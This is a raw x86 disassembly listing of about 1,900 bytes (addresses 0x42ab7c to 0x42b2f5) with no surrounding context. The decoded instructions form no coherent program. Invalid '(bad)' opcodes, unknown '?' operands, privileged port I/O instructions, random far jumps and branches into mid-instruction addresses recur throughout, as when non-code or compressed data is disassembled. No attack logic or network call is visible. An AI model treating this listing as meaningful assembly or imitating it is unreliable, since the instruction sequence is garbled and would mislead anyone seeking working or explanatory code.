  42ab7c:	jno    0x42ab81
  42ab7e:	imul   ebp,esi,0x24
  42ab81:	loope  0x42abd5
  42ab83:	mov    ebx,0xe7b1c151
  42ab88:	pop    eax
  42ab89:	sti    
  42ab8a:	adc    DWORD PTR [ebp-0x43],esp
  42ab8d:	loop   0x42ab18
  42ab8f:	scas   al,BYTE PTR es:[edi]
  42ab90:	test   al,0x5b
  42ab92:	push   0x2a1575d5
  42ab97:	int    0xc5
  42ab99:	ret    0x8142
  42ab9c:	(bad)  
  42ab9d:	pop    edx
  42ab9e:	dec    ecx
  42ab9f:	xor    dh,BYTE PTR [esi]
  42aba1:	mov    dh,0x8
  42aba3:	inc    ebx
  42aba4:	aad    0x40
  42aba6:	add    esi,eax
  42aba8:	rol    DWORD PTR [ecx],1
  42abaa:	mov    eax,0x310eda61
  42abaf:	and    BYTE PTR [ecx-0x4acc3306],dh
  42abb5:	pop    ebp
  42abb6:	jno    0x42ab59
  42abb8:	inc    esp
  42abb9:	div    esi
  42abbb:	fisub  WORD PTR [edi]
  42abbd:	rcr    DWORD PTR cs:[esi+esi*4-0x72],cl
  42abc2:	or     BYTE PTR [esi],ch
  42abc4:	mov    DWORD PTR [ecx],ebp
  42abc6:	mov    ds:0x884a5ed8,al
  42abcb:	ss add eax,0x324b36dd
  42abd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42abd2:	pop    ebp
  42abd3:	cmp    eax,0xa5d83241
  42abd8:	lea    ecx,[ebp+0x36b57207]
  42abde:	push   ds
  42abdf:	mov    ebp,0x8d8598d2
  42abe4:	test   DWORD PTR [ebp-0x1d418349],ebp
  42abea:	push   esp
  42abeb:	scas   al,BYTE PTR es:[edi]
  42abec:	sti    
  42abed:	add    DWORD PTR [esi+0x6b],eax
  42abf0:	pop    ss
  42abf1:	sar    DWORD PTR [edx],1
  42abf3:	add    eax,0x1053a49c
  42abf8:	cdq    
  42abf9:	sub    al,0x6d
  42abfb:	in     eax,dx
  42abfc:	(bad)  
  42abfd:	mov    edx,0xfb2c13a9
  42ac02:	push   eax
  42ac03:	aad    0x9e
  42ac05:	inc    edx
  42ac06:	sbb    DWORD PTR [edx],0x39a02e8a
  42ac0c:	loop   0x42abee
  42ac0e:	mov    ds:0xdb473714,al
  42ac13:	inc    esi
  42ac14:	push   ecx
  42ac15:	bound  edx,QWORD PTR [eax-0x3d]
  42ac18:	add    DWORD PTR [edi-0x2b],eax
  42ac1b:	sub    DWORD PTR [edi],esi
  42ac1d:	push   ss
  42ac1e:	pop    eax
  42ac1f:	push   0x50
  42ac21:	clc    
  42ac22:	add    eax,0xea5aa669
  42ac27:	adc    eax,0xcb8be200
  42ac2c:	add    BYTE PTR [ebx],dl
  42ac2e:	push   0xfffffffc
  42ac30:	lea    ebp,[esi+0x7]
  42ac33:	les    eax,FWORD PTR [esi-0x2f]
  42ac36:	aas    
  42ac37:	mov    edi,0x5b6ce0f5
  42ac3c:	dec    ebx
  42ac3d:	pop    ebx
  42ac3e:	or     cl,dh
  42ac40:	push   es
  42ac41:	mov    esp,0xa1691cdf
  42ac46:	jmp    0x42ac0d
  42ac48:	and    BYTE PTR es:[esi+0x63],ch
  42ac4c:	mov    eax,0xcc8bcfb
  42ac51:	fcmovnb st,st(2)
  42ac53:	(bad)  
  42ac54:	inc    ebp
  42ac55:	or     cl,al
  42ac57:	imul   ebx,DWORD PTR [edx-0x30],0xffffffbf
  42ac5b:	mov    edi,0xaa3b5306
  42ac60:	outs   dx,BYTE PTR ds:[esi]
  42ac61:	pop    ecx
  42ac62:	inc    edi
  42ac63:	adc    ecx,DWORD PTR [ebp+0x176684da]
  42ac69:	push   ss
  42ac6a:	mov    dh,0xa6
  42ac6c:	fidivr DWORD PTR [edi-0x41]
  42ac6f:	ins    DWORD PTR es:[edi],dx
  42ac70:	push   0x5b
  42ac72:	scas   eax,DWORD PTR es:[edi]
  42ac73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac74:	xchg   esi,eax
  42ac75:	add    BYTE PTR [eax-0x60],bl
  42ac78:	push   0xfffffff5
  42ac7a:	cmp    BYTE PTR [esi-0x15a2ec93],dl
  42ac80:	iret   
  42ac81:	rol    BYTE PTR [edi-0x1f],cl
  42ac84:	retf   0x70db
  42ac87:	pusha  
  42ac88:	fiadd  DWORD PTR [eax]
  42ac8a:	mov    ch,0x83
  42ac8c:	test   al,0x86
  42ac8e:	inc    ebp
  42ac8f:	call   0x8975:0xb40b40c0
  42ac96:	jecxz  0x42aca0
  42ac98:	jg     0x42acd8
  42ac9a:	aas    
  42ac9b:	cmp    eax,DWORD PTR [eax]
  42ac9d:	fiadd  DWORD PTR [eax+0x78]
  42aca0:	fimul  WORD PTR [edx]
  42aca2:	adc    edi,DWORD PTR [edx+0x35]
  42aca5:	jmp    0x1bcf:0xaf0f02c2
  42acac:	fldenv [edx]
  42acae:	sub    ah,BYTE PTR [ebp+ebp*4+0xb]
  42acb2:	loopne 0x42ac57
  42acb4:	xor    ecx,DWORD PTR [eax+0x4fad3afd]
  42acba:	fdiv   QWORD PTR [esi+0x463d3b85]
  42acc0:	xor    dh,BYTE PTR [edi+0x3aec7274]
  42acc6:	mov    eax,0xb6a7b616
  42accb:	not    DWORD PTR [eax+0x48]
  42acce:	sbb    dh,al
  42acd0:	mov    ecx,0x491c18f
  42acd5:	jo     0x42acb2
  42acd7:	fsub   st,st(0)
  42acd9:	clc    
  42acda:	fisub  WORD PTR [edi]
  42acdc:	pop    edi
  42acdd:	mov    eax,0x636d4bf8
  42ace2:	adc    edx,DWORD PTR [edx+ecx*2]
  42ace5:	and    al,bl
  42ace7:	mov    WORD PTR [esi-0xb],gs
  42acea:	dec    ecx
  42aceb:	aaa    
  42acec:	outs   dx,BYTE PTR ds:[esi]
  42aced:	pop    ebx
  42acee:	dec    ebx
  42acef:	and    esp,DWORD PTR [ebx-0xf]
  42acf2:	ds inc esp
  42acf4:	dec    edx
  42acf5:	sbb    cl,BYTE PTR [ebp+0x1d8a00bd]
  42acfb:	push   eax
  42acfc:	retf   
  42acfd:	xor    ch,ch
  42acff:	xor    BYTE PTR [ecx],ah
  42ad01:	dec    esi
  42ad02:	mov    BYTE PTR [eax-0x4c],al
  42ad05:	(bad)  [edx+0x19]
  42ad08:	enter  0xd80a,0xa2
  42ad0c:	pop    esp
  42ad0d:	sbb    al,0x4
  42ad0f:	sbb    eax,DWORD PTR [eax-0x42396c8a]
  42ad15:	mov    esp,es
  42ad17:	xlat   BYTE PTR ds:[ebx]
  42ad18:	lods   eax,DWORD PTR ds:[esi]
  42ad19:	cld    
  42ad1a:	push   edx
  42ad1b:	push   ebx
  42ad1c:	inc    esp
  42ad1d:	sbb    DWORD PTR [edx],eax
  42ad1f:	push   0xffffffde
  42ad21:	add    BYTE PTR [eax+0x346ee302],ah
  42ad27:	mov    ds:0xb32a9496,al
  42ad2c:	xchg   ebx,eax
  42ad2d:	adc    dl,BYTE PTR [ecx-0x576493eb]
  42ad33:	pop    edx
  42ad34:	mov    eax,ds:0xbbf90b67
  42ad39:	mov    cl,0xb0
  42ad3b:	xor    eax,0x6db0bb71
  42ad40:	fs std 
  42ad42:	push   es
  42ad43:	imul   edx,DWORD PTR [ebx-0x393d3d3e],0x46
  42ad4a:	dec    eax
  42ad4b:	or     eax,DWORD PTR [ebx]
  42ad4d:	in     al,dx
  42ad4e:	sub    BYTE PTR [edx+0x23b1473d],bh
  42ad54:	jmp    0x2660:0x7e7dc339
  42ad5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad5c:	lea    esp,ds:0x51a70c20
  42ad62:	outs   dx,DWORD PTR ds:[esi]
  42ad63:	ds push es
  42ad65:	ficom  DWORD PTR [eax+eax*8-0x50]
  42ad69:	popf   
  42ad6a:	ins    DWORD PTR es:[edi],dx
  42ad6b:	ins    DWORD PTR es:[edi],dx
  42ad6c:	jle    0x42addf
  42ad6e:	add    DWORD PTR [eax+0x625ad01d],esp
  42ad74:	(bad)  
  42ad75:	(bad)  
  42ad76:	sbb    eax,DWORD PTR [edx]
  42ad78:	mov    eax,0xbcb4a2e4
  42ad7d:	sbb    eax,0xbfb963e3
  42ad82:	or     BYTE PTR [ebp+0x3f0086a2],al
  42ad88:	and    bh,dl
  42ad8a:	je     0x42ad2d
  42ad8c:	ins    DWORD PTR es:[edi],dx
  42ad8d:	and    BYTE PTR [esi+eiz*1+0x53],0x98
  42ad92:	(bad)  
  42ad93:	cli    
  42ad94:	aaa    
  42ad95:	jnp    0x42ada5
  42ad97:	test   al,0x76
  42ad99:	inc    esp
  42ad9a:	outs   dx,BYTE PTR ds:[esi]
  42ad9b:	mov    dh,0xfe
  42ad9d:	mul    DWORD PTR [edx+0x3]
  42ada0:	inc    ecx
  42ada1:	mov    bh,0x2f
  42ada3:	push   ebx
  42ada4:	or     al,0x90
  42ada6:	aad    0x2d
  42ada8:	shl    DWORD PTR [edi],0xda
  42adab:	mov    dh,0xa3
  42adad:	dec    edx
  42adae:	ja     0x42ad74
  42adb0:	inc    edi
  42adb1:	and    eax,0xb0100f35
  42adb6:	mov    ah,0x5c
  42adb8:	stos   BYTE PTR es:[edi],al
  42adb9:	ins    DWORD PTR es:[edi],dx
  42adba:	mov    WORD PTR [edx+0x7a],gs
  42adbd:	push   edi
  42adbe:	mov    cs,WORD PTR [eax+0x56e2ae2d]
  42adc4:	adc    esp,ecx
  42adc6:	inc    eax
  42adc7:	xor    BYTE PTR fs:[ebx-0x4923ea82],bl
  42adce:	test   DWORD PTR [esi-0x7b],edi
  42add1:	mov    ds:0x4e3e0eaa,al
  42add6:	lahf   
  42add7:	shl    DWORD PTR [esi+0x32724da8],1
  42addd:	lock pop ebx
  42addf:	jg     0x57a40ded
  42ade5:	fwait
  42ade6:	mov    cl,BYTE PTR [esp+esi*1+0x5c]
  42adea:	adc    DWORD PTR [ebp-0x25],esi
  42aded:	push   0xb2300e02
  42adf2:	xchg   BYTE PTR [edx],dl
  42adf4:	cmp    al,0xba
  42adf6:	stos   BYTE PTR es:[edi],al
  42adf7:	mov    eax,0xbed286d0
  42adfc:	cmp    al,0xed
  42adfe:	stos   DWORD PTR es:[edi],eax
  42adff:	mov    ch,0x52
  42ae01:	push   edi
  42ae02:	adc    DWORD PTR [edi],edx
  42ae04:	mov    eax,0xe3fa089e
  42ae09:	ds ins BYTE PTR es:[edi],dx
  42ae0b:	or     ebx,ebx
  42ae0d:	(bad)  
  42ae0e:	sub    al,0x1b
  42ae10:	pop    ecx
  42ae11:	(bad)
  42ae14:	dec    ecx
  42ae15:	jge    0x42ade4
  42ae17:	and    BYTE PTR cs:[esi+0x2c],ch
  42ae1b:	pop    es
  42ae1c:	xchg   edi,eax
  42ae1d:	and    al,0x8
  42ae1f:	das    
  42ae20:	xchg   esp,eax
  42ae21:	sbb    dl,0x50
  42ae24:	aam    0x30
  42ae26:	jmp    0x95effaa9
  42ae2b:	sub    BYTE PTR [ebp+0x7d6b8d1a],0x68
  42ae32:	sub    BYTE PTR [ebp-0x18],bl
  42ae35:	and    BYTE PTR [eax+0x3188985c],bh
  42ae3b:	fiadd  WORD PTR [ecx]
  42ae3d:	test   BYTE PTR [eax-0x7e],ah
  42ae40:	mov    dh,0x4d
  42ae42:	add    edx,ebx
  42ae44:	push   0xffffffb4
  42ae46:	fwait
  42ae47:	adc    DWORD PTR [esi-0x207149ea],ebp
  42ae4d:	mov    bh,0x59
  42ae4f:	js     0x42ae88
  42ae51:	xor    ecx,eax
  42ae53:	mov    cl,0xfd
  42ae55:	fdiv   DWORD PTR [esi-0x5b11791e]
  42ae5b:	mov    esi,0xec8dce09
  42ae60:	scas   al,BYTE PTR es:[edi]
  42ae61:	mov    ah,0xb
  42ae63:	lea    ecx,[ebp+0x22]
  42ae66:	repnz push ds
  42ae68:	lea    ebp,[ecx+0x155feadb]
  42ae6e:	fwait
  42ae6f:	mov    BYTE PTR [esi],ch
  42ae71:	push   edx
  42ae72:	test   edi,edi
  42ae74:	push   ebp
  42ae75:	push   esp
  42ae76:	out    dx,al
  42ae77:	push   0x6b
  42ae79:	mov    bh,0x43
  42ae7b:	sbb    BYTE PTR [eax+edx*8-0x11],dh
  42ae7f:	mov    esp,0xa3b02c38
  42ae84:	mov    ch,BYTE PTR [ebp-0x68ca9cb0]
  42ae8a:	inc    ebp
  42ae8b:	push   es
  42ae8c:	mov    dh,BYTE PTR [esi]
  42ae8e:	push   eax
  42ae8f:	cdq    
  42ae90:	and    DWORD PTR [edi],esp
  42ae92:	imul   ebx,ebp,0x36
  42ae95:	push   ss
  42ae96:	mov    dh,0x7
  42ae98:	push   0xf9054903
  42ae9d:	das    
  42ae9e:	mov    bl,0x48
  42aea0:	pop    ds
  42aea1:	fild   DWORD PTR [ebp-0x3b]
  42aea4:	lods   eax,DWORD PTR ds:[esi]
  42aea5:	or     ebp,DWORD PTR [esi-0x7f]
  42aea8:	jl     0x42aedb
  42aeaa:	dec    eax
  42aeab:	mov    ch,0xe6
  42aead:	ins    BYTE PTR es:[edi],dx
  42aeae:	ins    DWORD PTR es:[edi],dx
  42aeaf:	sub    ch,BYTE PTR [edx-0x7]
  42aeb2:	xor    al,0xce
  42aeb4:	and    DWORD PTR [edi],ebx
  42aeb6:	repnz add BYTE PTR [ebp+0x6016040d],0x65
  42aebe:	ins    DWORD PTR es:[edi],dx
  42aebf:	or     esp,DWORD PTR [ecx+0x1f89ab62]
  42aec5:	mov    dh,0x34
  42aec7:	out    0x3,al
  42aec9:	rol    DWORD PTR [ebp-0x5339abaa],1
  42aecf:	fdiv   DWORD PTR [ecx-0x7f]
  42aed2:	mov    ds:0x97b9076d,al
  42aed7:	data16 je 0x42af05
  42aeda:	mov    eax,ds:0xadb76c01
  42aedf:	sbb    edx,ecx
  42aee1:	(bad)  
  42aee2:	outs   dx,BYTE PTR ds:[esi]
  42aee3:	dec    esp
  42aee4:	dec    edx
  42aee5:	mov    DWORD PTR [esi-0x5d],edx
  42aee8:	in     eax,dx
  42aee9:	test   al,0x36
  42aeeb:	ret    0xb470
  42aeee:	mov    ?,edi
  42aef0:	pavgw  mm0,QWORD PTR [ebx]
  42aef3:	mov    al,ds:0x36636dc2
  42aef8:	(bad)  
  42aef9:	loope  0x42ae96
  42aefb:	or     BYTE PTR [eax+0x5bb5b8e5],ch
  42af01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af02:	out    0x13,al
  42af04:	fnstcw WORD PTR [di-0x80]
  42af08:	pop    edi
  42af09:	(bad)  
  42af0a:	fcomp  QWORD PTR [edx+0x4b]
  42af0d:	push   ebp
  42af0e:	xor    al,0x9b
  42af10:	mov    edx,0xc6d8d401
  42af15:	in     eax,0xdb
  42af17:	ins    DWORD PTR es:[edi],dx
  42af18:	test   eax,0xe15f2e2f
  42af1d:	push   ebx
  42af1e:	repnz das 
  42af20:	add    BYTE PTR [edi+0x31],ah
  42af23:	mov    ch,ch
  42af25:	mov    dh,0x6d
  42af27:	mov    edi,0x62cff5af
  42af2c:	sbb    al,0xfe
  42af2e:	inc    ecx
  42af2f:	cdq    
  42af30:	test   DWORD PTR [esi-0x5f],eax
  42af33:	xor    DWORD PTR ds:0xbe227c50,0xb6e356e
  42af3d:	mov    ch,0x33
  42af3f:	ret    0x4f11
  42af42:	inc    edx
  42af43:	inc    esi
  42af44:	inc    ecx
  42af45:	sub    al,al
  42af47:	jbe    0x42aeea
  42af49:	or     ebx,esp
  42af4b:	repz push 0xffffffaa
  42af4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af4f:	sbb    DWORD PTR [esi],ecx
  42af51:	mov    cl,0x50
  42af53:	je     0x42af56
  42af55:	scas   eax,DWORD PTR es:[di]
  42af57:	sbb    BYTE PTR [ecx+0x15361542],bl
  42af5d:	and    BYTE PTR [ebp+0xd],ch
  42af60:	popf   
  42af61:	loop   0x42af9a
  42af63:	mov    dh,0x8d
  42af65:	lods   eax,DWORD PTR ds:[esi]
  42af66:	and    bh,BYTE PTR [edi]
  42af68:	inc    edx
  42af69:	mov    al,ds:0xbc125462
  42af6e:	jb     0x42afb7
  42af70:	add    eax,0x76ad2837
  42af75:	xor    BYTE PTR [ebx+0x607dadc4],ah
  42af7b:	push   eax
  42af7c:	cmp    eax,0x9e51dac9
  42af81:	jno    0x42af1e
  42af83:	cmp    al,0xa8
  42af85:	mov    es:0xd86b054d,al
  42af8b:	push   edx
  42af8c:	imul   ebx,DWORD PTR [ebx],0xffffffed
  42af8f:	push   esi
  42af90:	pop    edx
  42af91:	or     eax,0xf83e4a39
  42af96:	sub    DWORD PTR [ecx+edx*2],0xffffffa6
  42af9a:	in     eax,dx
  42af9b:	and    BYTE PTR [esi-0x218c83a5],dh
  42afa1:	inc    esp
  42afa2:	mov    BYTE PTR [eax-0x79],cl
  42afa5:	leave  
  42afa6:	pop    ebp
  42afa7:	je     0x42af52
  42afa9:	mov    al,0x20
  42afab:	iret   
  42afac:	mov    ebx,DWORD PTR [ebx-0x5943b236]
  42afb2:	call   0x395dc4ce
  42afb7:	scas   al,BYTE PTR es:[edi]
  42afb8:	icebp  
  42afb9:	lds    ecx,FWORD PTR [esi+0xe8dd6a]
  42afbf:	xchg   edi,eax
  42afc0:	mov    ?,WORD PTR [esi]
  42afc2:	mov    ah,0xfd
  42afc4:	mov    es,WORD PTR [esi+0x60236d82]
  42afca:	add    ecx,edx
  42afcc:	mov    ds:0x40d6c270,eax
  42afd1:	aam    0x67
  42afd3:	daa    
  42afd4:	jl     0x42af63
  42afd6:	cmp    esp,DWORD PTR [esi]
  42afd8:	dec    ecx
  42afd9:	or     eax,0x63c01b40
  42afde:	cwde   
  42afdf:	and    eax,0xa09a3caa
  42afe4:	mov    edx,0xadb7e36d
  42afe9:	xchg   DWORD PTR [ebp+0x444b3312],ecx
  42afef:	jmp    0x42afa7
  42aff1:	inc    esi
  42aff2:	or     eax,0xcee31c65
  42aff7:	nop
  42aff8:	aam    0x76
  42affa:	popa   
  42affb:	imul   ebp,edi,0x29
  42affe:	dec    ebx
  42afff:	jo     0x42affd
  42b001:	shl    DWORD PTR [edx],1
  42b003:	scas   al,BYTE PTR es:[edi]
  42b004:	sbb    cl,BYTE PTR [eax-0x158faca5]
  42b00a:	pop    DWORD PTR [esi+eax*4-0x45]
  42b00e:	inc    ecx
  42b00f:	mov    ecx,0xaae850b1
  42b014:	aaa    
  42b015:	fcomip st,st(4)
  42b017:	rcl    DWORD PTR [ecx+eax*1+0xa],cl
  42b01b:	cs inc esi
  42b01e:	inc    edx
  42b01f:	xchg   ecx,eax
  42b020:	int3   
  42b021:	test   al,0xbe
  42b023:	gs add ah,dh
  42b026:	push   eax
  42b027:	add    BYTE PTR [ecx+0x4528d007],bl
  42b02d:	push   gs
  42b02f:	pop    esi
  42b030:	(bad)  
  42b031:	(bad)  
  42b033:	pop    eax
  42b034:	push   ss
  42b035:	data16 aas 
  42b037:	test   DWORD PTR [edi+eax*2],esp
  42b03a:	in     eax,dx
  42b03b:	push   0xffffff92
  42b03d:	mov    ch,0xd0
  42b03f:	add    DWORD PTR [esp+esi*1],ebp
  42b042:	cld    
  42b043:	aam    0x5
  42b045:	inc    ebx
  42b046:	mov    eax,0xba20e858
  42b04b:	cli    
  42b04c:	sbb    BYTE PTR [ebx+eax*4-0x566bc2aa],bl
  42b053:	push   ecx
  42b054:	ins    DWORD PTR es:[edi],dx
  42b055:	lods   eax,DWORD PTR ds:[esi]
  42b056:	fisub  WORD PTR [eax]
  42b058:	daa    
  42b059:	inc    ebx
  42b05a:	enter  0x65b6,0x63
  42b05e:	popa   
  42b05f:	sbb    eax,0x41751e10
  42b064:	aam    0x71
  42b066:	mov    bl,0x6d
  42b068:	or     ebp,DWORD PTR [ebp+0x1]
  42b06b:	inc    eax
  42b06c:	pop    ecx
  42b06d:	ret    0x8340
  42b070:	clc    
  42b071:	test   al,0x54
  42b073:	cmp    ecx,DWORD PTR [eax]
  42b075:	mov    eax,0x3ff0c471
  42b07a:	sub    eax,0x52ed6dfc
  42b07f:	push   edi
  42b080:	cs inc esi
  42b082:	ficomp DWORD PTR [ebp+0x42b3d46f]
  42b088:	or     ecx,DWORD PTR [ebx]
  42b08a:	ins    DWORD PTR es:[edi],dx
  42b08b:	mov    ebx,0x567e5f29
  42b090:	mov    al,0xa7
  42b092:	int    0xa9
  42b094:	popa   
  42b095:	jno    0x42b074
  42b097:	mov    dh,0x9a
  42b099:	mov    al,ds:0xd082abd0
  42b09e:	int    0xaa
  42b0a0:	imul   edi,DWORD PTR [ecx],0xb6db1103
  42b0a6:	adc    al,0x58
  42b0a8:	dec    ebp
  42b0a9:	ins    DWORD PTR es:[edi],dx
  42b0aa:	imul   esp,DWORD PTR [eax+edi*8-0x7e],0x68
  42b0af:	sub    BYTE PTR [edx+0x29],0x4b
  42b0b3:	push   esi
  42b0b4:	call   0x6b3f:0xd6e29a96
  42b0bb:	add    al,BYTE PTR ds:0xd108c2c7
  42b0c1:	(bad)  
  42b0c2:	inc    eax
  42b0c3:	sub    eax,0xdb8f08dc
  42b0c8:	call   0x56edd8a5
  42b0cd:	aam    0x6
  42b0cf:	sbb    bl,0x3c
  42b0d2:	ds pop edi
  42b0d4:	fstp   DWORD PTR [eax+0x325df51f]
  42b0da:	rol    BYTE PTR [ecx],1
  42b0dc:	stos   BYTE PTR es:[edi],al
  42b0dd:	mul    BYTE PTR [ebp-0x1d7220ec]
  42b0e3:	push   edx
  42b0e4:	add    esi,DWORD PTR [edi+ecx*4+0x5cd9f878]
  42b0eb:	fidivr DWORD PTR [ebx+0x1]
  42b0ee:	sub    eax,0x894ba0ea
  42b0f3:	push   ebx
  42b0f4:	pop    esp
  42b0f5:	cmp    al,0xb4
  42b0f7:	ins    DWORD PTR es:[edi],dx
  42b0f8:	aad    0x3
  42b0fa:	cmc    
  42b0fb:	push   ss
  42b0fc:	inc    ecx
  42b0fd:	mov    ds:0xb62854a8,eax
  42b102:	push   ss
  42b103:	xor    al,0xca
  42b105:	(bad)  
  42b106:	scas   eax,DWORD PTR es:[edi]
  42b107:	stc    
  42b108:	sbb    bl,BYTE PTR [ebx]
  42b10a:	or     BYTE PTR [edx-0x24ebf235],bh
  42b110:	mov    edx,0x574963b
  42b115:	ins    BYTE PTR es:[edi],dx
  42b116:	aaa    
  42b117:	push   esp
  42b118:	sar    DWORD PTR [ebp+ebx*1-0x7819519b],cl
  42b11f:	lods   eax,DWORD PTR ds:[esi]
  42b120:	mov    ds:0x56610a16,eax
  42b125:	(bad)
  42b128:	sub    BYTE PTR [esi],dh
  42b12a:	shl    DWORD PTR [ebp+0x1666b6fe],0xef
  42b131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b132:	pop    ecx
  42b133:	in     eax,dx
  42b134:	(bad)  
  42b135:	push   edi
  42b136:	fwait
  42b137:	add    ch,BYTE PTR [eax+0x4b]
  42b13a:	(bad)
  42b13f:	sbb    eax,0x82a3adb6
  42b144:	xor    eax,0x30b057ac
  42b149:	adc    esp,ecx
  42b14b:	inc    esi
  42b14c:	push   ebx
  42b14d:	add    DWORD PTR [edi],edx
  42b14f:	xchg   edi,eax
  42b150:	mov    ds:0xf9b522f,al
  42b155:	adc    ah,ch
  42b157:	mov    ah,dl
  42b159:	or     esp,DWORD PTR [edx]
  42b15b:	enter  0x62f6,0x3a
  42b15f:	or     BYTE PTR [eax-0x26],bl
  42b162:	gs cwde 
  42b164:	push   es
  42b165:	mov    dh,0x48
  42b167:	add    esi,DWORD PTR [edx-0x7f4be293]
  42b16d:	(bad)  
  42b16e:	jp     0x42b171
  42b170:	retf   
  42b171:	push   esi
  42b172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b173:	or     ecx,DWORD PTR ds:0x1cffa441
  42b179:	xchg   esp,eax
  42b17a:	and    DWORD PTR [ecx+0x6edb5b55],0x11c26d0b
  42b184:	in     eax,dx
  42b185:	inc    esp
  42b186:	in     al,dx
  42b187:	mov    bl,0xa1
  42b189:	(bad)  [eax+0xb]
  42b18c:	or     eax,0xdd75b9cf
  42b191:	dec    edx
  42b192:	mov    eax,ds:0x54d50676
  42b197:	jo     0x42b168
  42b199:	js     0x42b1fa
  42b19b:	mov    es,edx
  42b19d:	fdiv   DWORD PTR [esi-0x67fa2af3]
  42b1a3:	pop    ebp
  42b1a4:	jb     0x42b135
  42b1a6:	xchg   edi,eax
  42b1a7:	sahf   
  42b1a8:	or     DWORD PTR ds:0x3481add1,edx
  42b1ae:	pop    ecx
  42b1af:	imul   edi,eax,0xffffffb9
  42b1b2:	fistp  DWORD PTR [edx]
  42b1b4:	and    dl,bl
  42b1b6:	dec    eax
  42b1b7:	jmp    0x6b1b:0xe1abb99
  42b1be:	scas   al,BYTE PTR es:[edi]
  42b1bf:	push   0xcc1b7157
  42b1c4:	aas    
  42b1c5:	push   0x1e
  42b1c7:	loop   0x42b14e
  42b1c9:	test   edx,eax
  42b1cb:	test   DWORD PTR ds:0x102cd185,ebp
  42b1d1:	aaa    
  42b1d2:	sbb    DWORD PTR [ebx],ebp
  42b1d4:	repnz mov dh,0x6d
  42b1d7:	fild   DWORD PTR [ecx+0x5f7074dc]
  42b1dd:	shr    BYTE PTR [ebx+0x1a],0x83
  42b1e1:	jle    0x42b1e3
  42b1e3:	push   ebx
  42b1e4:	sbb    DWORD PTR [edx],esp
  42b1e6:	outs   dx,BYTE PTR ds:[esi]
  42b1e7:	fisttp DWORD PTR [ecx+0x3b]
  42b1ea:	scas   al,BYTE PTR es:[edi]
  42b1eb:	mov    eax,ds:0xb6e31c9e
  42b1f0:	mov    al,0xb1
  42b1f2:	inc    eax
  42b1f3:	xchg   esi,eax
  42b1f4:	jbe    0x42b1d4
  42b1f6:	jp     0x42b277
  42b1f8:	pop    esi
  42b1f9:	adc    al,0x70
  42b1fb:	add    eax,0x89f3e8fd
  42b200:	call   0x421f28f5
  42b205:	inc    ebx
  42b206:	aam    0xd
  42b208:	xchg   eax,esi
  42b20a:	sbb    al,0x1e
  42b20c:	xchg   edx,eax
  42b20d:	sbb    eax,0x821b6d05
  42b212:	mov    dh,0x80
  42b214:	mov    dl,0xfd
  42b216:	lea    esi,[edi+0x58b6083a]
  42b21c:	xchg   ch,dl
  42b21e:	mov    ds:0x5969d68a,eax
  42b223:	ins    BYTE PTR es:[edi],dx
  42b224:	xor    BYTE PTR [esi+0x40],0x2e
  42b228:	push   esp
  42b229:	cmp    BYTE PTR [edx-0x4b47dbb9],0xb5
  42b230:	(bad)  
  42b232:	mov    WORD PTR [eax+ebx*4],cs
  42b235:	mov    WORD PTR [ecx+0x77],cs
  42b238:	mov    al,0x82
  42b23a:	xchg   esi,eax
  42b23b:	ss adc ah,bh
  42b23e:	lock les ebp,FWORD PTR [esi]
  42b241:	cmp    BYTE PTR [ebp+0x20e75357],bh
  42b247:	pusha  
  42b248:	popa   
  42b249:	fisttp DWORD PTR [edx+eax*2+0x5b2b6eda]
  42b250:	jne    0x42b263
  42b252:	pop    esp
  42b253:	push   0x7de5b4e8
  42b258:	dec    edi
  42b259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b25a:	fimul  DWORD PTR [eax+0x286ed82e]
  42b260:	dec    ebx
  42b261:	daa    
  42b262:	pop    ecx
  42b263:	dec    edx
  42b264:	std    
  42b265:	sbb    dh,BYTE PTR [eax-0x39d277dd]
  42b26b:	aas    
  42b26c:	mov    WORD PTR [ebp+0x77],?
  42b26f:	stos   BYTE PTR es:[edi],al
  42b270:	mov    edx,0x69b54075
  42b275:	and    ebp,DWORD PTR [edi]
  42b277:	and    edx,DWORD PTR [esi+0x369a36a0]
  42b27d:	xchg   ecx,eax
  42b27e:	push   ecx
  42b27f:	xor    DWORD PTR [ecx+0x46],ebx
  42b282:	ins    DWORD PTR es:[edi],dx
  42b283:	test   al,0x96
  42b285:	add    eax,0x294ff9f3
  42b28a:	lods   al,BYTE PTR ds:[esi]
  42b28b:	dec    eax
  42b28c:	push   ecx
  42b28d:	aam    0x3e
  42b28f:	mov    ch,0xc2
  42b291:	out    0x21,eax
  42b293:	xchg   ebx,eax
  42b294:	pop    esi
  42b295:	(bad)  
  42b297:	push   edx
  42b298:	sub    ebp,DWORD PTR [edx-0x22851860]
  42b29e:	sbb    edx,DWORD PTR [eax+eax*1]
  42b2a1:	sbb    bh,BYTE PTR [esi+0xb130237]
  42b2a7:	sub    eax,0x7f781bb5
  42b2ac:	ror    DWORD PTR [esi],0x98
  42b2af:	and    eax,0x8540f1ef
  42b2b4:	add    bl,BYTE PTR [ebx]
  42b2b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2b7:	push   0x5d
  42b2b9:	out    0xc1,al
  42b2bb:	xchg   BYTE PTR [eax],al
  42b2bd:	ss fwait
  42b2bf:	jne    0x42b2c3
  42b2c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b2c2:	in     eax,0xc2
  42b2c4:	add    ebx,ebx
  42b2c6:	(bad)  
  42b2c7:	inc    ebp
  42b2c8:	ins    BYTE PTR es:[edi],dx
  42b2c9:	adc    bh,dl
  42b2cb:	jp     0x42b32c
  42b2cd:	fldenv [ebp*2+0x5c283450]
  42b2d4:	and    DWORD PTR [esi+eax*4-0x24aba276],esi
  42b2db:	shr    cl,1
  42b2dd:	fiadd  WORD PTR [edx+0x53]
  42b2e0:	ror    BYTE PTR [ebp+0xfab48fa],1
  42b2e6:	out    dx,eax
  42b2e7:	fmul   DWORD PTR [ebx+ebp*1-0x58]
  42b2eb:	in     eax,0xc2
  42b2ed:	jo     0x42b30e
  42b2ef:	add    BYTE PTR ds:0xb0bf5fe,bl
  42b2f5:	sbb    eax,0xf314feb5
